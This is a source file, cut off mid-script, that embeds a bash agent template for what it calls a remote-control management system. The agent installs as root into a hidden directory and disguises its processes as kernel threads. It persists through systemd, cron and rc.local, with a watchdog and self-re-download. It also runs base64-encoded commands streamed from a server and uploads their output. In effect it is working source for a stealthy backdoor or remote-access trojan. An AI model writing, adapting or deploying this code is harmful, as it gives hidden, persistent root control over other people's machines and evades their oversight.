// Auto-generated: bash agent script template with URL placeholders
// Do not edit manually. Regenerate from the original agent.sh.php
export const AGENT_SCRIPT_TEMPLATE = `#!/usr/bin/env bash
# ============================================================
# 远控管理系统 - 被控端 Agent
# 由服务端 agent.sh.php 动态生成，请勿手动编辑。
# ============================================================

set +u  # 不使用 set -u，防止 curl|bash 模式下未定义变量导致意外退出

# ---------------- 全局配置 ----------------
API_URL="__API_URL__"                       # Agent 通信接口地址（注册 / 结果上报）
CONNECT_URL="__CONNECT_URL__"               # Agent 流式连接地址（实时接收命令）
SCRIPT_URL="__SCRIPT_URL__"                 # 自身下载地址
INSTALL_DIR="/usr/local/share/.sys-cache"   # 安装目录
AGENT_FILE="\${INSTALL_DIR}/.sys-helper"     # Agent 主程序路径
ID_FILE="\${INSTALL_DIR}/.sys-id"            # Agent ID 存储文件
TOKEN_FILE="\${INSTALL_DIR}/.sys-token"       # Agent 认证令牌存储文件
IP_FILE="\${INSTALL_DIR}/.sys-ip"             # 公网 IP 缓存文件（避免内网/公网来回切换）
UUID_FILE="\${INSTALL_DIR}/.sys-uuid"        # 设备 UUID 兜底存储（无 machine-id 时）
LOCK_FILE="\${INSTALL_DIR}/.sys-lock"        # 单实例锁文件（flock）
PID_FILE="\${INSTALL_DIR}/.sys-pid"          # 主进程 PID 记录
HEARTBEAT_FILE="\${INSTALL_DIR}/.sys-hb"     # 主进程心跳时间戳
WATCHDOG_PID_FILE="\${INSTALL_DIR}/.sys-wdp" # 看门狗 PID 记录
SERVICE_NAME="sys-helper"                   # systemd 服务名
POLL_INTERVAL=0.3                           # 轮询间隔（秒，服务端长轮询已做节流）
CMD_TIMEOUT=300                             # 单条命令超时（秒）
RESULT_MAX=262144                           # 结果最大字节数（256KB）
MAX_BACKOFF=30                              # 网络故障最大退避间隔（秒）
WATCHDOG_INTERVAL=5                         # 命令执行期间喂狗间隔（秒）
WATCHDOG_TIMEOUT=180                        # 心跳超时阈值（秒），超过判定假死
WATCHDOG_CHECK_INTERVAL=10                  # 看门狗巡检间隔（秒）
# 进程伪装名（模拟内核线程，<=15 字符以适配 /proc/<pid>/comm）
PROC_NAME_MAIN="[kworker/u8:2]"             # 主进程伪装名
PROC_NAME_WD="[ksoftirqd/0]"               # 看门狗伪装名

# ---------------- 运行状态 ----------------
RUNNING=1   # 1=运行中，0=收到停止信号

# ---------------- 颜色输出（仅交互终端） ----------------
if [ -t 1 ]; then
    C_GREEN='\\033[0;32m'; C_RED='\\033[0;31m'; C_YELLOW='\\033[0;33m'
    C_CYAN='\\033[0;36m'; C_RESET='\\033[0m'
else
    C_GREEN=''; C_RED=''; C_YELLOW=''; C_CYAN=''; C_RESET=''
fi

log()  { echo -e "\${C_CYAN}[*]\${C_RESET} $*"; }
ok()   { echo -e "\${C_GREEN}[+]\${C_RESET} $*"; }
warn() { echo -e "\${C_YELLOW}[!]\${C_RESET} $*"; }
err()  { echo -e "\${C_RED}[-]\${C_RESET} $*" >&2; }
die()  { err "$*"; [ -t 0 ] || sleep 2; exit 1; }

# ---------------- 检查 root 权限 ----------------
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        die "请使用 root 权限运行：sudo bash $AGENT_FILE"
    fi
}

# ---------------- 进程伪装 ----------------
# 修改 /proc/self/comm（影响 top/htop/ps -e 显示，限 15 字符）
disguise() {
    local name="$1"
    echo -n "$name" > /proc/self/comm 2>/dev/null || true
}

# ---------------- URL 编码（纯 bash 实现，供 wget 回退使用） ----------------
urlencode() {
    local string="$1" encoded="" i c code
    for ((i = 0; i < \${#string}; i++)); do
        c="\${string:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *)
                printf -v code '%%%02X' "'$c"
                encoded+="$code"
                ;;
        esac
    done
    printf '%s' "$encoded"
}

# 构建 application/x-www-form-urlencoded 格式的 POST body
build_post_data() {
    local out=""
    while [ $# -ge 2 ]; do
        local k="$1" v="$2"; shift 2
        [ -n "$out" ] && out+="&"
        out+="\${k}=$(urlencode "$v")"
    done
    printf '%s' "$out"
}

# ---------------- HTTP POST（curl 优先，wget 兼容） ----------------
# 用法: http_post <url> key1 val1 key2 val2 ...
http_post() {
    local url="$1"; shift
    if command -v curl >/dev/null 2>&1; then
        # curl 原生 --data-urlencode 可正确处理 UTF-8 多字节字符
        # --max-time 20 留足余量以兼容服务端长轮询（最长挂起 10s）+ 排队延迟
        local args=()
        while [ $# -ge 2 ]; do
            args+=( --data-urlencode "$1=$2" )
            shift 2
        done
        curl -sS --connect-timeout 5 --max-time 20 -X POST "\${args[@]}" "$url"
    elif command -v wget >/dev/null 2>&1; then
        # wget 无原生 urlencode，使用纯 bash 实现（按字节编码）
        local body
        body=$(build_post_data "$@")
        wget -qO- --timeout=20 --post-data="$body" "$url" 2>/dev/null
    else
        err "未找到 curl 或 wget，无法通信"
        return 1
    fi
}

# ---------------- 流式连接（实时接收命令） ----------------
# 与服务端 connect 端点建立长连接，逐行读取推送的命令。
# 返回 0 且输出流式数据；无 curl 时返回 1（调用方回退长轮询）。
# 用法: stream_connect <agent_id> <hostname> <ip> <token> <sys_info>
stream_connect() {
    local agent_id="$1" hostname="$2" ip="$3" token="$4" sys_info="$5"

    if command -v curl >/dev/null 2>&1; then
        # -N 禁用输出缓冲，服务端每行即时到达；--max-time 30 匹配服务端 25 秒生命周期 + 余量
        local token_arg=""
        [ -n "$token" ] && token_arg="--data-urlencode token=$token"
        # 构建系统信息参数
        local sys_args=()
        if [ -n "$sys_info" ]; then
            local line k v
            while IFS= read -r line; do
                [ -z "$line" ] && continue
                k="\${line%%=*}"
                v="\${line#*=}"
                sys_args+=( --data-urlencode "$k=$v" )
            done <<< "$sys_info"
        fi
        curl -sS -N --connect-timeout 5 --max-time 30 -X POST \\
            --data-urlencode "agent_id=$agent_id" \\
            --data-urlencode "hostname=$hostname" \\
            --data-urlencode "ip=$ip" \\
            $token_arg \\
            "\${sys_args[@]}" \\
            "$CONNECT_URL" 2>/dev/null
    else
        # 无 curl 时返回失败，调用方回退到长轮询 checkin
        return 1
    fi
}

# ---------------- systemd 通知（看门狗 / 就绪通知） ----------------
# 仅在 systemd Type=notify 服务下生效；非 systemd 环境静默跳过。
# 用法: sd_notify --ready | sd_notify WATCHDOG=1 | sd_notify --stopping
sd_notify() {
    [ -z "\${NOTIFY_SOCKET:-}" ] && return 0
    command -v systemd-notify >/dev/null 2>&1 || return 0
    systemd-notify "$@" 2>/dev/null || true
}

# ---------------- 单实例锁（flock 优先，PID 文件回退） ----------------
# 成功获取返回 0 并写入 PID；已有实例运行返回 1。
acquire_lock() {
    mkdir -p "$INSTALL_DIR" 2>/dev/null
    if command -v flock >/dev/null 2>&1; then
        # 用文件描述符 200 持有 advisory lock，进程退出即自动释放
        exec 200>"$LOCK_FILE"
        if ! flock -n 200; then
            return 1
        fi
    else
        # 无 flock 时用 PID 文件做简单互斥
        if [ -f "$PID_FILE" ]; then
            local old_pid
            old_pid=$(cat "$PID_FILE" 2>/dev/null)
            if [ -n "$old_pid" ] && kill -0 "$old_pid" 2>/dev/null; then
                return 1
            fi
        fi
    fi
    echo $$ > "$PID_FILE" 2>/dev/null || true
    return 0
}

# ---------------- 信号处理：优雅退出 ----------------
on_signal() {
    RUNNING=0
}

# ---------------- 读取已保存的 Agent ID ----------------
get_agent_id() {
    if [ -f "$ID_FILE" ]; then
        cat "$ID_FILE"
    else
        echo ""
    fi
}

# ---------------- 读取已保存的 Agent 令牌 ----------------
get_agent_token() {
    if [ -f "$TOKEN_FILE" ]; then
        cat "$TOKEN_FILE"
    else
        echo ""
    fi
}

# ---------------- 获取公网 IP（带缓存，避免内网/公网来回切换） ----------------
# 策略：
#   1. 尝试从外部服务获取公网 IP
#   2. 成功则缓存到 IP_FILE，返回公网 IP
#   3. 失败则读取 IP_FILE 中的缓存 IP
#   4. 缓存也不存在时才用内网 IP 兜底
get_public_ip() {
    local ip=""

    # 1) 尝试外部服务获取公网 IP（多源容错，超时 3 秒）
    if command -v curl >/dev/null 2>&1; then
        ip=$(curl -s --max-time 3 https://ifconfig.me 2>/dev/null)
        [ -z "$ip" ] && ip=$(curl -s --max-time 3 https://icanhazip.com 2>/dev/null | tr -d '[:space:]')
        [ -z "$ip" ] && ip=$(curl -s --max-time 3 https://api.ipify.org 2>/dev/null | tr -d '[:space:]')
    elif command -v wget >/dev/null 2>&1; then
        ip=$(wget -qO- --timeout=3 https://ifconfig.me 2>/dev/null)
        [ -z "$ip" ] && ip=$(wget -qO- --timeout=3 https://icanhazip.com 2>/dev/null | tr -d '[:space:]')
        [ -z "$ip" ] && ip=$(wget -qO- --timeout=3 https://api.ipify.org 2>/dev/null | tr -d '[:space:]')
    fi

    # 验证获取到的 IP 格式（简单校验，防止垃圾输出）
    if [ -n "$ip" ] && echo "$ip" | grep -qE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$'; then
        # 公网 IP 获取成功，缓存到文件
        echo "$ip" > "$IP_FILE" 2>/dev/null
        printf '%s' "$ip"
        return
    fi

    # 2) 公网 IP 获取失败，读取缓存
    if [ -f "$IP_FILE" ]; then
        local cached_ip
        cached_ip=$(cat "$IP_FILE" 2>/dev/null | tr -d '[:space:]')
        if [ -n "$cached_ip" ]; then
            printf '%s' "$cached_ip"
            return
        fi
    fi

    # 3) 缓存也不存在，用内网 IP 兜底（首次启动或缓存丢失）
    hostname -I 2>/dev/null | awk '{print $1}'
}

# ---------------- 采集系统信息（供服务端监控展示） ----------------
# 输出格式: key=value 逐行，供服务端解析
collect_sys_info() {
    local mem_total=0 mem_used=0 mem_avail=0
    local disk_total=0 disk_used=0
    local cpu_load=0 cpu_cores=1
    local uptime_s=0 os_ver="" kernel="" arch=""

    # ---- 内存信息 ----
    if [ -r /proc/meminfo ]; then
        mem_total=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)}')
        mem_avail=$(grep MemAvailable /proc/meminfo 2>/dev/null | awk '{print int($2/1024)}')
        if [ -n "$mem_total" ] && [ -n "$mem_avail" ]; then
            mem_used=$((mem_total - mem_avail))
        fi
    fi

    # ---- 磁盘信息（根分区） ----
    # 用 MB 为单位避免小磁盘 int() 截断丢失精度
    local df_line
    df_line=$(df -BM / 2>/dev/null | awk 'NR==2{print $2,$3}')
    if [ -n "$df_line" ]; then
        disk_total=$(echo "$df_line" | awk '{print int($1)}' | tr -d 'M')
        disk_used=$(echo "$df_line" | awk '{print int($2)}' | tr -d 'M')
    fi

    # ---- CPU 负载（取 /proc/loadavg 第一列，乘 100 除以核数得百分比） ----
    cpu_cores=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
    local load1
    load1=$(awk '{print $1}' /proc/loadavg 2>/dev/null || echo "0")
    if [ -n "$load1" ] && [ "$cpu_cores" -gt 0 ] 2>/dev/null; then
        # 负载百分比 = load1 / cores * 100，取整
        cpu_load=$(awk -v l="$load1" -v c="$cpu_cores" 'BEGIN { p = (l / c) * 100; if (p > 100) p = 100; printf "%d", p }')
    fi

    # ---- 系统运行时间（秒） ----
    uptime_s=$(awk '{print int($1)}' /proc/uptime 2>/dev/null || echo 0)

    # ---- OS 版本 ----
    if [ -f /etc/os-release ]; then
        os_ver=$(grep ^PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2- | tr -d '"' | head -c 80)
    elif [ -f /etc/redhat-release ]; then
        os_ver=$(head -c 80 /etc/redhat-release 2>/dev/null)
    else
        os_ver=$(uname -sr 2>/dev/null | head -c 80)
    fi

    # ---- 内核版本 ----
    kernel=$(uname -r 2>/dev/null | head -c 60)

    # ---- 架构 ----
    arch=$(uname -m 2>/dev/null | head -c 20)

    # 输出 key=value 格式
    echo "sys_mem_total=$mem_total"
    echo "sys_mem_used=$mem_used"
    echo "sys_disk_total=$disk_total"
    echo "sys_disk_used=$disk_used"
    echo "sys_cpu_load=$cpu_load"
    echo "sys_cpu_cores=$cpu_cores"
    echo "sys_uptime=$uptime_s"
    echo "sys_os=$os_ver"
    echo "sys_kernel=$kernel"
    echo "sys_arch=$arch"
}

# ---------------- 获取设备 UUID（作为 Agent ID） ----------------
# 优先取系统稳定的 machine-id，保证「同机器 = 同 ID」，
# 从而在服务端实现查重：重装不会产生重复主机。
get_device_uuid() {
    local uuid="" f

    # 1) systemd / dbus machine-id（最通用、跨重启稳定）
    for f in /etc/machine-id /var/lib/dbus/machine-id; do
        if [ -s "$f" ]; then
            uuid=$(tr -d '[:space:]' < "$f" 2>/dev/null)
            [ -n "$uuid" ] && break
        fi
    done

    # 2) DMI 产品 UUID（物理机 / 部分虚拟机）
    if [ -z "$uuid" ] && [ -r /sys/class/dmi/id/product_uuid ]; then
        uuid=$(tr -d '[:space:]' < /sys/class/dmi/id/product_uuid 2>/dev/null)
    fi

    # 3) 兜底：生成一个随机 UUID 并持久化，保证后续稳定
    if [ -z "$uuid" ]; then
        if [ -s "$UUID_FILE" ]; then
            uuid=$(cat "$UUID_FILE" 2>/dev/null)
        fi
        if [ -z "$uuid" ]; then
            uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || true)
            [ -z "$uuid" ] && uuid=$(uuidgen 2>/dev/null || true)
            [ -z "$uuid" ] && uuid="$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \\n' 2>/dev/null)"
            mkdir -p "$INSTALL_DIR" 2>/dev/null
            echo "$uuid" > "$UUID_FILE" 2>/dev/null
        fi
    fi

    # 归一化：转小写、去掉连字符；若为 32 位十六进制则格式化为标准 UUID
    uuid=$(echo "$uuid" | tr '[:upper:]' '[:lower:]' | tr -d '-')
    if [ \${#uuid} -eq 32 ] && [ -n "\${uuid##*[^0-9a-f]*}" ]; then
        uuid="\${uuid:0:8}-\${uuid:8:4}-\${uuid:12:4}-\${uuid:16:4}-\${uuid:20:12}"
    fi

    printf '%s' "$uuid"
}

# ---------------- 心跳机制 ----------------
# 主进程定期写入时间戳，看门狗据此判定是否假死
write_heartbeat() {
    date +%s > "$HEARTBEAT_FILE" 2>/dev/null
}

# 返回心跳距今秒数；无心跳文件返回极大值
heartbeat_age() {
    if [ ! -f "$HEARTBEAT_FILE" ]; then
        echo 999999
        return
    fi
    local hb now
    hb=$(cat "$HEARTBEAT_FILE" 2>/dev/null)
    now=$(date +%s)
    if [ -z "$hb" ] || [ -z "$now" ]; then
        echo 999999
        return
    fi
    echo $((now - hb))
}

# ---------------- 自愈：脚本缺失时重新下载 ----------------
self_heal() {
    if [ ! -s "$AGENT_FILE" ]; then
        warn "Agent 脚本缺失，尝试重新下载..."
        if command -v curl >/dev/null 2>&1; then
            curl -sSL "$SCRIPT_URL" -o "$AGENT_FILE" 2>/dev/null
        else
            wget -qO "$AGENT_FILE" "$SCRIPT_URL" 2>/dev/null
        fi
        if [ -s "$AGENT_FILE" ]; then
            chmod +x "$AGENT_FILE"
            ok "Agent 脚本已恢复"
        else
            err "Agent 脚本恢复失败"
            return 1
        fi
    fi
    return 0
}

# ---------------- 进程拉起（带伪装名） ----------------
# 以伪装名启动主进程
spawn_main() {
    (exec -a "$PROC_NAME_MAIN" bash "$AGENT_FILE" --run) >/dev/null 2>&1 &
    disown 2>/dev/null || true
}

# 以伪装名启动看门狗（若已有看门狗在运行则跳过）
spawn_watchdog() {
    if [ -f "$WATCHDOG_PID_FILE" ]; then
        local wd_pid
        wd_pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
        if [ -n "$wd_pid" ] && kill -0 "$wd_pid" 2>/dev/null; then
            return 0
        fi
    fi
    (exec -a "$PROC_NAME_WD" bash "$AGENT_FILE" --watchdog) >/dev/null 2>&1 &
    disown 2>/dev/null || true
}

# 主进程检查看门狗是否存活，不存活则重新拉起
check_watchdog() {
    if [ -f "$WATCHDOG_PID_FILE" ]; then
        local wd_pid
        wd_pid=$(cat "$WATCHDOG_PID_FILE" 2>/dev/null)
        if [ -n "$wd_pid" ] && kill -0 "$wd_pid" 2>/dev/null; then
            return 0
        fi
    fi
    spawn_watchdog
}

# ---------------- 清理已有安装残留 ----------------
# 检测到旧脚本 / 服务存在时：终止进程、移除保活、删除残留文件。
# 保留 UUID_FILE 以维持设备身份稳定（重装后注册到同一 Agent ID）。
cleanup_existing() {
    local detected=0 pid

    # 检测信号：脚本文件 / systemd 服务 / cron 条目
    [ -s "$AGENT_FILE" ] && detected=1
    [ -f "/etc/systemd/system/\${SERVICE_NAME}.service" ] && detected=1
    if crontab -l 2>/dev/null | grep -q "\${AGENT_FILE}" 2>/dev/null; then
        detected=1
    fi

    [ "$detected" -eq 0 ] && return 0

    warn "检测到已有安装，正在终止进程并清理残留..."

    # 停止并移除 systemd 服务
    if [ -f "/etc/systemd/system/\${SERVICE_NAME}.service" ]; then
        systemctl stop "\${SERVICE_NAME}" >/dev/null 2>&1
        systemctl disable "\${SERVICE_NAME}" >/dev/null 2>&1
        rm -f "/etc/systemd/system/\${SERVICE_NAME}.service"
        systemctl daemon-reload >/dev/null 2>&1
    fi

    # 移除 cron 条目
    crontab -l 2>/dev/null | grep -v "\${AGENT_FILE}" | crontab - 2>/dev/null

    # 移除 rc.local 条目
    if [ -f /etc/rc.local ]; then
        sed -i "/\${AGENT_FILE}/d" /etc/rc.local 2>/dev/null
    fi

    # 杀死主进程和看门狗（仅按 PID 文件，不使用 pkill -f 避免正则误杀）
    for f in "$PID_FILE" "$WATCHDOG_PID_FILE"; do
        if [ -f "$f" ]; then
            pid=$(cat "$f" 2>/dev/null)
            [ -n "$pid" ] && kill -9 "$pid" 2>/dev/null
        fi
    done
    # 安全兜底：用 pgrep -x 精确匹配 comm 名（非正则），避免误杀其他进程
    for comm_name in "$PROC_NAME_MAIN" "$PROC_NAME_WD"; do
        for p in $(pgrep -x "$comm_name" 2>/dev/null); do
            kill -9 "$p" 2>/dev/null
        done
    done 2>/dev/null

    # 删除残留文件（保留 UUID_FILE 维持设备身份）
    rm -f "$AGENT_FILE" "$ID_FILE" "$TOKEN_FILE" "$IP_FILE" "$LOCK_FILE" "$PID_FILE" \\
          "$HEARTBEAT_FILE" "$WATCHDOG_PID_FILE"

    # 等待进程完全退出
    sleep 1
    ok "残留清理完成"
}

# ---------------- 安装：清理旧安装 → 下载 → 注册 → 配置保活 ----------------
do_install() {
    check_root

    # 检测到原有脚本则终止进程、清理残留，然后执行新安装
    cleanup_existing

    log "开始安装被控端 Agent..."

    # 创建安装目录（权限收紧）
    mkdir -p "$INSTALL_DIR"
    chmod 700 "$INSTALL_DIR"

    # 下载 Agent 脚本到目标位置
    log "下载 Agent 脚本到 $AGENT_FILE"
    if command -v curl >/dev/null 2>&1; then
        curl -sSL "$SCRIPT_URL" -o "$AGENT_FILE" || die "下载失败"
    else
        wget -qO "$AGENT_FILE" "$SCRIPT_URL" || die "下载失败"
    fi
    chmod +x "$AGENT_FILE"

    # 向服务端注册获取 Agent ID
    do_register

    # 安装开机自启与保活机制
    install_persistence

    ok "安装完成！"
    do_status
}

# ---------------- 注册：获取并保存 Agent ID 与令牌 ----------------
# 以设备 UUID 作为身份上报；服务端据此查重，同设备复用同一 Agent ID。
do_register() {
    local hostname os_info device_uuid resp agent_id agent_token
    hostname=$(hostname 2>/dev/null || echo "unknown")
    os_info=$(uname -a 2>/dev/null || echo "unknown")
    device_uuid=$(get_device_uuid)
    # 极端情况下取不到 UUID，则用内核随机 UUID 兜底
    [ -z "$device_uuid" ] && device_uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "")

    log "向服务端注册（设备 UUID: $device_uuid）..."
    resp=$(http_post "$API_URL" action register hostname "$hostname" \\
        os_info "$os_info" device_uuid "$device_uuid")

    # 解析 Agent ID 和令牌（格式: AGENT_ID:<id>\nTOKEN:<token>）
    if [[ "$resp" == AGENT_ID:* ]]; then
        # 提取 Agent ID（第一行）
        agent_id="\${resp%%$'\\n'*}"
        agent_id="\${agent_id#AGENT_ID:}"
        agent_id="$(echo -n "$agent_id" | tr -d '[:space:]')"

        # 提取令牌（第二行，可能不存在以兼容旧服务端）
        if [[ "$resp" == *$'\\n'TOKEN:* ]]; then
            agent_token="\${resp#*$'\\n'TOKEN:}"
            agent_token="$(echo -n "$agent_token" | tr -d '[:space:]')"
        fi

        echo "$agent_id" > "$ID_FILE"
        chmod 600 "$ID_FILE"

        if [ -n "$agent_token" ]; then
            echo "$agent_token" > "$TOKEN_FILE"
            chmod 600 "$TOKEN_FILE"
        fi

        ok "注册成功，Agent ID: $agent_id"
    else
        die "注册失败：$resp"
    fi
}

# ---------------- 配置保活（三层持久化） ----------------
# 优先 systemd → 回退 cron → 再回退 rc.local
install_persistence() {
    log "配置开机自启与保活..."

    # 第一层：systemd（Type=notify + 看门狗 + 崩溃自愈 + 资源限制）
    if [ -d /etc/systemd/system ]; then
        cat > "/etc/systemd/system/\${SERVICE_NAME}.service" <<UNIT
[Unit]
Description=Remote Admin Helper Service
After=network-online.target
Wants=network-online.target
# 防止崩溃风暴：300 秒内重启超过 10 次则停止
StartLimitIntervalSec=300
StartLimitBurst=10

[Service]
Type=simple
ExecStart=/bin/bash -c 'exec -a "\${PROC_NAME_MAIN}" "\${AGENT_FILE}" --run'
Restart=always
RestartSec=5
# 优雅停止：发 SIGTERM 等待 15 秒后 SIGKILL
KillSignal=SIGTERM
TimeoutStopSec=15
# 资源限制，防止异常命令拖垮宿主
MemoryMax=256M
CPUQuota=50%
TasksMax=64
LimitNOFILE=256
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
UNIT
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable "\${SERVICE_NAME}" >/dev/null 2>&1
        systemctl restart "\${SERVICE_NAME}" >/dev/null 2>&1
        if systemctl is-active --quiet "\${SERVICE_NAME}" 2>/dev/null; then
            ok "systemd 服务已启动并设为开机自启（伪装已启用）"
        else
            warn "systemd 启动失败，将使用 cron 监视保活"
        fi
    fi

    # 第二层：cron 每分钟监视（无论 systemd 是否成功都配置，作为双重保活）
    fallback_cron
    # 第三层：rc.local 兜底（无 systemd 且无 cron 的系统）
    fallback_rc_local
}

# 回退保活：nohup 后台运行 + cron 每分钟检查拉起。
# 关键：do_run 内有 flock 单实例锁，cron 触发时若已有实例运行会立即退出，
#       因此每分钟只在 Agent 已死亡时才拉起新实例，杜绝多进程重复执行。
fallback_cron() {
    # 即时拉起一次（通过 PID 文件判断是否已在运行）
    local running=0
    if [ -f "$PID_FILE" ]; then
        local pid
        pid=$(cat "$PID_FILE" 2>/dev/null)
        [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null && running=1
    fi
    [ "$running" -eq 0 ] && spawn_main

    # cron 每分钟调用 --run；由 flock 保证单实例
    local cron_entry="* * * * * \${AGENT_FILE} --run >/dev/null 2>&1"
    (crontab -l 2>/dev/null | grep -v "\${AGENT_FILE}" ; echo "$cron_entry") | crontab - 2>/dev/null
    ok "已配置 cron 监视保活（单实例锁防重复）"
}

# 第三层兜底：rc.local（适用于无 systemd 且无 cron 的精简系统）
fallback_rc_local() {
    # 检测 cron 是否可用，可用则不需要 rc.local
    if command -v crontab >/dev/null 2>&1; then
        return 0
    fi
    local rc_entry="[ -x \${AGENT_FILE} ] && \${AGENT_FILE} --run >/dev/null 2>&1 &"
    if [ -f /etc/rc.local ]; then
        if ! grep -q "$AGENT_FILE" /etc/rc.local 2>/dev/null; then
            sed -i "s|^\\(exit 0\\)|\${rc_entry}\\n\\1|" /etc/rc.local 2>/dev/null
        fi
    elif [ -d /etc ]; then
        printf '#!/bin/bash\\n%s\\nexit 0\\n' "$rc_entry" > /etc/rc.local 2>/dev/null
        chmod +x /etc/rc.local 2>/dev/null
    fi
    ok "已配置 rc.local 兜底保活"
}

# ---------------- 执行单条命令 ----------------
# 参数: cmd_id  base64_command
execute_command() {
    local cmd_id="$1" b64_cmd="$2"
    local cmd output exit_code agent_id

    # 收到停止信号则不再启动新命令
    [ "$RUNNING" -ne 1 ] && return 1

    # base64 解码（兼容不同系统）
    if command -v base64 >/dev/null 2>&1; then
        cmd=$(echo "$b64_cmd" | base64 -d 2>/dev/null)
    else
        cmd=$(echo "$b64_cmd" | openssl enc -d -base64 2>/dev/null)
    fi
    [ -z "$cmd" ] && cmd="$b64_cmd"

    log "执行命令 [$cmd_id]: $cmd"

    # 后台执行命令，主循环在等待期间持续写心跳 + 喂狗 + 检查停止信号
    local tmp_out cmd_pid elapsed
    tmp_out=$(mktemp 2>/dev/null || echo "/tmp/.sys-out.$$")

    if command -v timeout >/dev/null 2>&1; then
        timeout "$CMD_TIMEOUT" bash -c "$cmd" >"$tmp_out" 2>&1 &
    else
        bash -c "$cmd" >"$tmp_out" 2>&1 &
    fi
    cmd_pid=$!
    elapsed=0

    # 等待命令完成，期间持续写心跳以防看门狗误杀
    while kill -0 "$cmd_pid" 2>/dev/null; do
        write_heartbeat
        sd_notify WATCHDOG=1
        # 收到停止信号则杀掉当前命令
        [ "$RUNNING" -ne 1 ] && { kill -KILL "$cmd_pid" 2>/dev/null; break; }
        sleep "$WATCHDOG_INTERVAL"
        elapsed=$((elapsed + WATCHDOG_INTERVAL))
        # 无 timeout 命令时手动强制超时
        if ! command -v timeout >/dev/null 2>&1 && [ "$elapsed" -ge "$CMD_TIMEOUT" ]; then
            kill -KILL "$cmd_pid" 2>/dev/null
            break
        fi
    done
    wait "$cmd_pid" 2>/dev/null
    exit_code=$?
    output=$(cat "$tmp_out" 2>/dev/null)
    rm -f "$tmp_out"

    # 结果截断到 RESULT_MAX 字节
    if [ \${#output} -gt $RESULT_MAX ]; then
        output="\${output:0:$RESULT_MAX}"
        output="\${output}
...[结果已截断]"
    fi

    # 上报执行结果
    agent_id=$(get_agent_id)
    agent_token=$(get_agent_token)
    [ -z "$agent_id" ] && { err "无 Agent ID，无法上报结果"; return 1; }

    http_post "$API_URL" action result agent_id "$agent_id" \\
        cmd_id "$cmd_id" result "$output" exit_code "$exit_code" \\
        token "$agent_token" >/dev/null 2>&1
}

# ---------------- 内层循环：优先流式连接，回退长轮询 ----------------
# 返回非零表示需要重新注册
inner_loop() {
    local agent_id="$1" hostname="$2" ip="$3" token="$4" sys_info="$5"

    # 有 curl 时使用流式连接（实时命令推送）；否则回退长轮询 checkin
    if command -v curl >/dev/null 2>&1; then
        inner_loop_stream "$agent_id" "$hostname" "$ip" "$token" "$sys_info"
    else
        inner_loop_poll "$agent_id" "$hostname" "$ip" "$token" "$sys_info"
    fi
}

# ---------------- 流式循环：长连接内实时接收并执行命令 ----------------
inner_loop_stream() {
    local agent_id="$1" hostname="$2" ip="$3" token="$4" sys_info="$5"
    local line cid b64 rest fail=0 connected

    while [ "$RUNNING" -eq 1 ]; do
        write_heartbeat
        check_watchdog
        connected=0

        # 流式连接：逐行读取服务端推送（process substitution 避免子 shell 变量丢失）
        while IFS= read -r line; do
            [ "$RUNNING" -ne 1 ] && break
            [ -z "$line" ] && continue

            case "$line" in
                OK\\ *)
                    # 连接确认
                    connected=1
                    fail=0
                    sd_notify WATCHDOG=1
                    write_heartbeat
                    ;;
                CMD\\ *)
                    # 解析: CMD <cmd_id> <base64_command>
                    rest="\${line#CMD }"
                    cid="\${rest%% *}"
                    b64="\${rest#* }"
                    [ "$cid" = "$rest" ] && continue
                    execute_command "$cid" "$b64"
                    ;;
                PING)
                    # 心跳保活
                    write_heartbeat
                    sd_notify WATCHDOG=1
                    ;;
                END)
                    # 服务端生命周期结束，正常重连
                    break
                    ;;
                ERROR:agent*)
                    err "服务端要求重新注册"
                    return 1
                    ;;
                ERROR:*)
                    err "服务端返回错误: $line"
                    ;;
            esac
        done < <(stream_connect "$agent_id" "$hostname" "$ip" "$token" "$sys_info")

        # 连接已断开，判断是否异常
        if [ "$connected" -eq 0 ]; then
            fail=$((fail + 1))
            local wait=$((POLL_INTERVAL * fail))
            [ "$wait" -gt "$MAX_BACKOFF" ] && wait="$MAX_BACKOFF"
            err "流式连接失败，\${wait}s 后重试..."
            sd_notify WATCHDOG=1
            sleep "$wait"
        else
            # 正常断开（END 或生命周期到），短暂等待后重连（0.2 秒，加快响应）
            sd_notify WATCHDOG=1
            sleep 0.2
        fi
    done
}

# ---------------- 回退循环：长轮询 checkin 拉取并执行命令 ----------------
# 仅在无 curl（无法流式连接）时使用
inner_loop_poll() {
    local agent_id="$1" hostname="$2" ip="$3" token="$4" sys_info="$5"
    local resp lines line cid b64 fail=0 wait

    while [ "$RUNNING" -eq 1 ]; do
        write_heartbeat
        check_watchdog

        # 构建系统信息参数
        local sys_args=()
        if [ -n "$sys_info" ]; then
            local si_line si_k si_v
            while IFS= read -r si_line; do
                [ -z "$si_line" ] && continue
                si_k="\${si_line%%=*}"
                si_v="\${si_line#*=}"
                sys_args+=( "$si_k" "$si_v" )
            done <<< "$sys_info"
        fi

        resp=$(http_post "$API_URL" action checkin agent_id "$agent_id" \\
            hostname "$hostname" ip "$ip" token "$token" "\${sys_args[@]}" 2>/dev/null)

        # 网络异常：指数退避后重试
        if [ -z "$resp" ]; then
            fail=$((fail + 1))
            wait=$((POLL_INTERVAL * fail))
            [ "$wait" -gt "$MAX_BACKOFF" ] && wait="$MAX_BACKOFF"
            sd_notify WATCHDOG=1
            sleep "$wait"
            continue
        fi

        fail=0
        sd_notify WATCHDOG=1

        case "$resp" in
            NO_COMMANDS)
                sleep "$POLL_INTERVAL"
                ;;
            ERROR:agent*)
                err "服务端要求重新注册"
                return 1
                ;;
            ERROR:*)
                err "服务端返回错误: $resp"
                sleep "$POLL_INTERVAL"
                ;;
            COMMANDS:*)
                lines="\${resp#COMMANDS:}"
                lines="\${lines#$'\\n'}"
                while IFS= read -r line; do
                    [ "$RUNNING" -ne 1 ] && break
                    [ -z "$line" ] && continue
                    cid="\${line%%$'\\t'*}"
                    b64="\${line#*$'\\t'}"
